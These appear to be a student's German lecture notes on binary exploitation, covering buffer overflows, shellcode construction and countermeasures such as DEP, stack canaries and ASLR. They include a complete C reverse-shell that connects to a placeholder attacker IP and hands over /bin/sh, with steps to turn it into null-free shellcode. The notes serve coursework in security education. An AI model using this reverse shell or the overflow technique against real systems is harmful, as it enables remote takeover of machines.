Datum: 07.11.
[[Master/Semester 1/IT Security/Slides/05 Applied Binary Exploitation.pdf|Folien]]
[[Master/Semester 1/IT Security/Übungen/05 Applied Binary Exploitation.pdf|Übung]]

# Applied Binary Exploitation

## Static Analysis

Analyse von Assembly durch angucken

`rip`: Spezialregister für instruction pointer (manipuliert mit `jmp`)
Intel syntax: `mov [target] [src]`

**Tool: `objdump`** - disassembly von Binaries

## Dynamic Analysis

Analyse von Assembly durch ausführen

**Tool: Debugger (`gdb`)**

gdb command `disassemble` macht dasselbe wie `objdump`
`set $pc = 0x...` setzt den instruction pointer
`set $rdi = ...` setzt Register rdi

## Buffer Overflow

Daten in den Buffer schreiben, die größer sind als der Buffer

`strcpy` überprüft nicht, ob der Buffer groß genug ist
`memcpy(dst, src, n)` auch nicht
`gets`: stdin in Buffer lesen, bis `\n` oder `EOF` kommt (wird durch `\0` ersetzt) - auch keine Checks und ist deprecated

Mit buffer overflows können Variablen und Returnadressen im Stack überschrieben werden

## Shellcode

Ein Shellcode ist ein Code, der bei Ausführung eine Shell (`/bin/sh`) startet.

*Ausführen eines Shellcodes mit Buffer-Overflow:*
- Schreibe `execve("/bin/sh")` in Assembly
- wandle diesen Code in Bytecode um
- Schreibe diesen Bytecode in den Buffer -> unser Code ist nun auf dem Stack
- fülle den Rest vom Buffer
- Unterhalb vom buffer liegen (irgendwann) geretteter `rbp` und die return-Adresse
- durch Buffer overflow: fülle `rbp` und ersetze Rücksprungadresse mit Adresse des Buffers (auf dem Stack)

**Remote Shell**
Meistens möchten wir über einen Shellcode Zugriff auf ein entferntes System erhalten.

Wir schreiben unseren shell code erst mal in C, danach bauen wir ihn (manuell) in Assembly nach.

Was macht der Shellcode?
- Öffnet einen [[SysProg - VL 11#Sockets|Socket]]
- verbindet den Socket mit unserem Rechner
- lenkt stdin und stdout zu diesem Socket
- führt `/bin/sh` aus

```c
/* Allocate a socket for IPv4/TCP (1) */
int sock = socket(AF_INET, SOCK_STREAM, 0);

/* Setup the connection structure (2) */
struct sockaddr_in sin;
sin.sin_family = AF_INET;
sin.sin_port = htons(1337);

/* Parse the IP address into network byte order (3) */
inet_pton(AF_INET, "unsere IP hier", &sin.sin_addr.s_addr);

/* Connect to the remote host (4) */
connect(sock, (struct sockaddr *)&sin, sizeof(struct sockaddr_in));

/* Duplicate the socket to STDIO (5) */
dup2(sock, STDIN_FILENO);
dup2(sock, STDOUT_FILENO);
dup2(sock, STDERR_FILENO);

/* Setup and execute a shell. (6) */
char *argv[] = {"/bin/sh", NULL};
execve("/bin/sh", argv, NULL);
```

Wir können das nicht einfach kompilieren, weil wir nicht die c library wrapper für syscalls möchten.

### C -> Shellcode

**1. Herausfinden von Syscalls**
Wir können mit `strace` den C-code ausführen und schauen, was für Syscalls gemacht werden.

**2. Syscall-Parameter**
Wir gucken nach, welche Parameter die Syscalls brauchen und in welche Register die gehören. Jeder Syscall ist identifiziert durch eine Nummer (kommt in `rax`).

**3. Rekonstruktion in Assembly**
Auf sowas wie network byte order, little endian etc. müssen wir selbst achten.

**4. In Hexstring umwandeln**
- In Object file umwandeln mit `nasm`
- Mit `objcopy` den Binary-Teil rauskopieren
- Mit `hexdump` als Hexcode anzeigen lassen


**5. De-Nullifying**

`strcpy` beendet bei Nullbyte, `scanf` bei anderen speziellen Bytes. Also möchten wir die im Shellcode gerne loswerden.

Zum Beispiel:
- `mov rax, 0` $\to$ `xor rax, rax` 
- `"/bin/sh\0"` $\to$ als Zweierkomplement in `rax` schreiben, dann `neg rax`

### Gegenmaßnahmen

- *Data Execution Prevention* (DEP): keine Daten vom Stack als ausführbaren Code interpretieren
- *Stack Canary:* zufälliger Wert auf dem Stack vor der Returnadresse, die vor dem Return überprüft wird $\to$ muss korrekt geraten werden, wenn man darüber hinaus auf den Stack schreiben möchte
- *ASLR:* Programm wird in zufälliger Speicheradresse geladen
	- Adresse vom Buffer (wir machen das ja immer noch mit Buffer-Overrun) vor Programmstart nicht bekannt

## Return-oriented Programming

